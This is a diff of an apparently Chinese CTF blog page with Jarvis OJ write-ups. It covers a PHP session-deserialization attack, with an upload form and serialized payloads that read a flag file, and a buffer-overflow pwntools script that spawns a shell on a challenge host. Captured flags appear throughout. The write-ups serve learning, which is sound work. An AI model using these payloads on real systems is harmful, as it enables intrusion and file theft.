class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	body &#123;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">background</span><span class="selector-pseudo">:gray</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>同时也可以知道 salt 的长度为12。</p>
 <hr>
 <h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p>题目入口：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
 <p>上来就给出了源码：</p>
-<pre><code class="PHP">&lt;?php
-//A webshell is wait for you
-ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); //设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。
-session_start();
-class OowoO
-{
-    public $mdzz;
-    function __construct()
-    {
-        $this-&gt;mdzz = &#39;phpinfo();&#39;;
-    }
-
-    function __destruct()
-    {
-        eval($this-&gt;mdzz);
-    }
-}
-if(isset($_GET[&#39;phpinfo&#39;]))
-{
-    $m = new OowoO();
-}
-else
-{
-    highlight_string(file_get_contents(&#39;index.php&#39;));
-}
-?&gt;
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>); <span class="comment">//设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>注意到 session.serialize_handler ，先放一篇关于 PHP 反序列化的<a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">文章</a>。</p>
 <p>PHP 内置了多种处理器用于在存取 $_SESSION 数据时，对数据进行序列化和反序列化：</p>
 <table>
@@ -796,34 +517,20 @@ else
 <p>要将数据注入到 session 中，一种情况是开发者本身将用户可控的数据传进了 session （比如 joomla 等）；另一方面则可通过 php 配置不当进行 session 控制，比如 session.upload_progress.enabled is on。当这个设置打开时，php 会记录上传文件的进度，在上传时会将其信息保存在 $_SESSION 中。</p>
 <p>下面开始漏洞利用。</p>
 <p>首先写一个提交表单备用：</p>
-<pre><code class="HTML">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
-    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;gogogo&quot; /&gt;
-    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
-    &lt;input type=&quot;submit&quot; /&gt;
-&lt;/form&gt;
-</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"gogogo"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>因为不知道 flag 藏在哪里，先试着获取当前目录下的文件列表。构造 payload ：</p>
-<pre><code class="PHP">&lt;?php
-class OowoO
-{
-    public $mdzz=&#39;print_r(scandir(dirname(__FILE__)));&#39;;
-}
-$obj = new OowoO();
-echo serialize($obj);
-?&gt;
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'print_r(scandir(dirname(__FILE__)));'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>序列化结果为：</p>
-<pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}
-</code></pre><p>为了防止引号被转义，在前面加个杠，再把它改为 session 的格式，即在 payload 开头位置加个 ‘|’ ，修改后的 payload 如下：</p>
-<pre><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}
-</code></pre><p>Burp start ，利用刚刚写的提交表单随便传个东西上去，抓包，修改 filename 为 payload （开头的 ‘|’ 后面如果加了空格会导致 payload 失效，去掉就好了）：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"OowoO"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"mdzz"</span>;<span class="attribute">s</span>:<span class="number">36</span>:<span class="string">"print_r(scandir(dirname(__FILE__)));"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>为了防止引号被转义，在前面加个杠，再把它改为 session 的格式，即在 payload 开头位置加个 ‘|’ ，修改后的 payload 如下：</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|<span class="attribute">O</span>:<span class="number">5</span>:\<span class="string">"OowoO\"</span>:<span class="number">1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:\<span class="string">"mdzz\"</span>;<span class="attribute">s</span>:<span class="number">36</span>:\<span class="string">"print_r(scandir(dirname(__FILE__)));\"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>Burp start ，利用刚刚写的提交表单随便传个东西上去，抓包，修改 filename 为 payload （开头的 ‘|’ 后面如果加了空格会导致 payload 失效，去掉就好了）：</p>
 <p><img src="/2017/11/04/jarvisoj-wp/PHPINFO-1.png" alt=""></p>
 <p>接下来就很简单了，去读取 Here_1s_7he_fl4g_buT_You_Cannot_see.php 就好。首先查询 PHPINFO 中的 _SERVER[“SCRIPT_FILENAME”] 得到当前目录为 /opt/lampp/htdocs/ ，将原 ‘xxx’ 处改为:</p>
-<pre><code class="PHP">print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(file_get_contents(<span class="string">"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"</span>));</span><br></pre></td></tr></table></figure>
 <p>序列化及一些小处理后得到最终 payload ：</p>
-<pre><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}
-</code></pre><p>用同样的方式 POST 一下就好了。</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:<span class="symbol">\"</span>OowoO<span class="symbol">\"</span>:1:&#123;s:4:<span class="symbol">\"</span>mdzz<span class="symbol">\"</span>;s:88:<span class="symbol">\"</span>print_r(file_get_contents(<span class="symbol">\"</span>/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php<span class="symbol">\"</span>));<span class="symbol">\"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>用同样的方式 POST 一下就好了。</p>
 <p><code>CTF{4d96e37f4be998c50aa586de4ada354a}</code></p>
 <hr>
 <h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h3><p>题目描述：</p>
@@ -832,73 +539,14 @@ echo serialize($obj);
 <p><a href="https://dn.jarvisoj.com/challengefiles/level0.b9ded3801d6dd36a97468e128b81a65d" target="_blank" rel="noopener">level0.b9ded3801d6dd36a97468e128b81a65d</a></p>
 </blockquote>
 <p> ida 载入，先是 main 函数：</p>
-<pre><code>.text:00000000004005C6 ; int __cdecl main(int argc, const char **argv, const char **envp)
-.text:00000000004005C6                 public main
-.text:00000000004005C6 main            proc near               ; DATA XREF: _start+1D↑o
-.text:00000000004005C6
-.text:00000000004005C6 var_10          = qword ptr -10h
-.text:00000000004005C6 var_4           = dword ptr -4
-.text:00000000004005C6
-.text:00000000004005C6 ; __unwind {
-.text:00000000004005C6                 push    rbp
-.text:00000000004005C7                 mov     rbp, rsp
-.text:00000000004005CA                 sub     rsp, 10h
-.text:00000000004005CE                 mov     [rbp+var_4], edi
-.text:00000000004005D1                 mov     [rbp+var_10], rsi
-.text:00000000004005D5                 mov     edx, 0Dh        ; n
-.text:00000000004005DA                 mov     esi, offset aHelloWorld ; &quot;Hello, World\n&quot;
-.text:00000000004005DF                 mov     edi, 1          ; fd
-.text:00000000004005E4                 call    _write
-.text:00000000004005E9                 mov     eax, 0
-.text:00000000004005EE                 call    vulnerable_function
-.text:00000000004005F3                 leave
-.text:00000000004005F4                 retn
-.text:00000000004005F4 ; } // starts at 4005C6
-.text:00000000004005F4 main            endp
-</code></pre><p>vulnerable_function 函数：</p>
-<pre><code>.text:00000000004005A6                 public vulnerable_function
-.text:00000000004005A6 vulnerable_function proc near           ; CODE XREF: main+28↓p
-.text:00000000004005A6
-.text:00000000004005A6 buf             = byte ptr -80h
-.text:00000000004005A6
-.text:00000000004005A6 ; __unwind {
-.text:00000000004005A6                 push    rbp
-.text:00000000004005A7                 mov     rbp, rsp
-.text:00000000004005AA                 add     rsp, 0FFFFFFFFFFFFFF80h
-.text:00000000004005AE                 lea     rax, [rbp+buf]
-.text:00000000004005B2                 mov     edx, 200h       ; nbytes
-.text:00000000004005B7                 mov     rsi, rax        ; buf
-.text:00000000004005BA                 mov     edi, 0          ; fd
-.text:00000000004005BF                 call    _read
-.text:00000000004005C4                 leave
-.text:00000000004005C5                 retn
-.text:00000000004005C5 ; } // starts at 4005A6
-.text:00000000004005C5 vulnerable_function endp
-</code></pre><p>以及一个未曾被调用但是能够打开 shell 的 callsystem 函数：</p>
-<pre><code>.text:0000000000400596                 public callsystem
-.text:0000000000400596 callsystem      proc near
-.text:0000000000400596 ; __unwind {
-.text:0000000000400596                 push    rbp
-.text:0000000000400597                 mov     rbp, rsp
-.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;
-.text:000000000040059F                 call    _system
-.text:00000000004005A4                 pop     rbp
-.text:00000000004005A5                 retn
-.text:00000000004005A5 ; } // starts at 400596
-.text:00000000004005A5 callsystem      endp
-</code></pre><p>可以利用 vulnerable_function 中的 read 函数进行缓冲区溢出，进而跳转到 callsystem 函数以 get shell 。</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 <span class="comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6                 public main</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 main            proc near               <span class="comment">; DATA XREF: _start+1D↑o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 var_10          = qword ptr <span class="number">-10</span>h</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 var_4           = dword ptr <span class="number">-4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6                 <span class="keyword">push</span>    rbp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C7                 <span class="keyword">mov</span>     rbp, rsp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>CA                 <span class="keyword">sub</span>     rsp, <span class="number">10</span>h</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>CE                 <span class="keyword">mov</span>     [rbp+var_4], edi</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>D1                 <span class="keyword">mov</span>     [rbp+var_10], rsi</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>D5                 <span class="keyword">mov</span>     edx, <span class="number">0</span>Dh        <span class="comment">; n</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>DA                 <span class="keyword">mov</span>     esi, offset aHelloWorld <span class="comment">; "Hello, World\n"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>DF                 <span class="keyword">mov</span>     edi, <span class="number">1</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005E4</span>                 <span class="keyword">call</span>    _write</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005E9</span>                 <span class="keyword">mov</span>     eax, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>EE                 <span class="keyword">call</span>    vulnerable_function</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F3                 leave</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F4                 retn</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F4 <span class="comment">; &#125; // starts at 4005C6</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F4 main            endp</span><br></pre></td></tr></table></figure>
+<p>vulnerable_function 函数：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000004005A6                 <span class="meta">public</span> vulnerable_function</span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6 vulnerable_function proc <span class="built_in">near</span>           <span class="comment">; CODE XREF: main+28↓p</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6</span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6 buf             = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">80h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6</span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A7                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005AA                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">0FFFFFFFFFFFFFF80h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005AE                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+buf]</span><br><span class="line"><span class="symbol">.text:</span>00000000004005B2                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">200h</span>       <span class="comment">; nbytes</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005B7                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rax</span>        <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005BA                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">0</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005BF                 <span class="keyword">call</span>    _read</span><br><span class="line"><span class="symbol">.text:</span>00000000004005C4                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C5                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C5 <span class="comment">; &#125; // starts at 4005A6</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C5 vulnerable_function endp</span><br></pre></td></tr></table></figure>
+<p>以及一个未曾被调用但是能够打开 shell 的 callsystem 函数：</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span>                 public callsystem</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span> callsystem      proc near</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span> <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span>                 <span class="keyword">push</span>    rbp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400597</span>                 <span class="keyword">mov</span>     rbp, rsp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000040059</span>A                 <span class="keyword">mov</span>     edi, offset command <span class="comment">; "/bin/sh"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000040059</span>F                 <span class="keyword">call</span>    _system</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A4                 <span class="keyword">pop</span>     rbp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5                 retn</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5 <span class="comment">; &#125; // starts at 400596</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5 callsystem      endp</span><br></pre></td></tr></table></figure>
+<p>可以利用 vulnerable_function 中的 read 函数进行缓冲区溢出，进而跳转到 callsystem 函数以 get shell 。</p>
 <p>ctrl + k 查看该函数的栈帧，buf 的首地址与栈返回地址的距离差为 (+0000000000000008) - (-0000000000000080) ，即 0x88 ，callsystem 函数的地址为 0x400596 ，接下来就可以写 poc 了：</p>
-<pre><code class="Python">from pwn import *
-
-sh = remote(&#39;pwn2.jarvisoj.com&#39;, 9881)
-
-padding = &#39;A&#39; * 0x88
-add = p64(0x400596)
-payload = padding + add
-sh.send(payload)
-
-sh.interactive()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9881</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line">add = p64(<span class="number">0x400596</span>)</span><br><span class="line">payload = padding + add</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>cat flag：</p>
 <p><code>CTF{713ca3944e92180e0ef03171981dcd41}</code></p>
 <h3 id="XMAN-level1"><a href="#XMAN-level1" class="headerlink" title="[XMAN]level1"></a>[XMAN]level1</h3><p>题目描述：</p>
@@ -908,429 +556,306 @@ sh.interactive()
 </blockquote>
 <p>checksec 一下发现什么保护都没有开，这次是一个 32 位的程序，ida 载入之：</p>
 <p>main 函数：</p>
-<pre><code>.text:080484B7 ; int __cdecl main(int argc, const char **argv, const char **envp)
-.text:080484B7                 public main
-.text:080484B7 main            proc near               ; DATA XREF: _start+17↑o
-.text:080484B7
-.text:080484B7 var_4           = dword ptr -4
-.text:080484B7 argc            = dword ptr  8
-.text:080484B7 argv            = dword ptr  0Ch
-.text:080484B7 envp            = dword ptr  10h
-.text:080484B7
-.text:080484B7 ; __unwind {
-.text:080484B7                 lea     ecx, [esp+4]
-.text:080484BB                 and     esp, 0FFFFFFF0h
-.text:080484BE                 push    dword ptr [ecx-4]
-.text:080484C1                 push    ebp
-.text:080484C2                 mov     ebp, esp
-.text:080484C4                 push    ecx
-.text:080484C5                 sub     esp, 4
-.text:080484C8                 call    vulnerable_function
-.text:080484CD                 sub     esp, 4
-.text:080484D0                 push    0Eh             ; n
-.text:080484D2                 push    offset aHelloWorld ; &quot;Hello, World!\n&quot;
-.text:080484D7                 push    1               ; fd
-.text:080484D9                 call    _write
-.text:080484DE                 add     esp, 10h
-.text:080484E1                 mov     eax, 0
-.text:080484E6                 mov     ecx, [ebp+var_4]
-.text:080484E9                 leave
-.text:080484EA                 lea     esp, [ecx-4]
-.text:080484ED                 retn
-.text:080484ED ; } // starts at 80484B7
-.text:080484ED main            endp
-</code></pre><p>在调用 vulnerable_function 函数之后 printf “Hello, World!\n”。</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">080484B7</span> ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:<span class="number">080484B7</span>                 public main</span><br><span class="line">.text:<span class="number">080484B7</span> main            proc near               ; DATA XREF: _start+<span class="number">17</span>↑o</span><br><span class="line">.text:<span class="number">080484B7</span></span><br><span class="line">.text:<span class="number">080484B7</span> var_4           = dword ptr -<span class="number">4</span></span><br><span class="line">.text:<span class="number">080484B7</span> argc            = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">080484B7</span> argv            = dword ptr  <span class="number">0Ch</span></span><br><span class="line">.text:<span class="number">080484B7</span> envp            = dword ptr  10h</span><br><span class="line">.text:<span class="number">080484B7</span></span><br><span class="line">.text:<span class="number">080484B7</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">080484B7</span>                 lea     ecx, [esp+<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080484BB</span>                 <span class="keyword">and</span>     esp, <span class="number">0FFFFFFF0h</span></span><br><span class="line">.text:<span class="number">080484BE</span>                 <span class="built_in">push</span>    dword ptr [ecx-<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080484C1</span>                 <span class="built_in">push</span>    ebp</span><br><span class="line">.text:<span class="number">080484C2</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">080484C4</span>                 <span class="built_in">push</span>    ecx</span><br><span class="line">.text:<span class="number">080484C5</span>                 sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">080484C8</span>                 call    vulnerable_function</span><br><span class="line">.text:<span class="number">080484CD</span>                 sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">080484D0</span>                 <span class="built_in">push</span>    <span class="number">0Eh</span>             ; n</span><br><span class="line">.text:<span class="number">080484D2</span>                 <span class="built_in">push</span>    offset aHelloWorld ; <span class="string">"Hello, World!\n"</span></span><br><span class="line">.text:<span class="number">080484D7</span>                 <span class="built_in">push</span>    <span class="number">1</span>               ; fd</span><br><span class="line">.text:<span class="number">080484D9</span>                 call    _write</span><br><span class="line">.text:<span class="number">080484DE</span>                 add     esp, 10h</span><br><span class="line">.text:<span class="number">080484E1</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">080484E6</span>                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:<span class="number">080484E9</span>                 leave</span><br><span class="line">.text:<span class="number">080484EA</span>                 lea     esp, [ecx-<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080484ED</span>                 retn</span><br><span class="line">.text:<span class="number">080484ED</span> ; &#125; // starts <span class="built_in">at</span> <span class="number">80484B7</span></span><br><span class="line">.text:<span class="number">080484ED</span> main            endp</span><br></pre></td></tr></table></figure>
+<p>在调用 vulnerable_function 函数之后 printf “Hello, World!\n”。</p>
 <p>看一下 vulnerable_function 函数：</p>
-<pre><code>.text:0804847B                 public vulnerable_function
-.text:0804847B vulnerable_function proc near           ; CODE XREF: main+11↓p
-.text:0804847B
-.text:0804847B buf             = byte ptr -88h
-.text:0804847B
-.text:0804847B ; __unwind {
-.text:0804847B                 push    ebp
-.text:0804847C                 mov     ebp, esp
-.text:0804847E                 sub     esp, 88h
-.text:08048484                 sub     esp, 8
-.text:08048487                 lea     eax, [ebp+buf]
-.text:0804848D                 push    eax
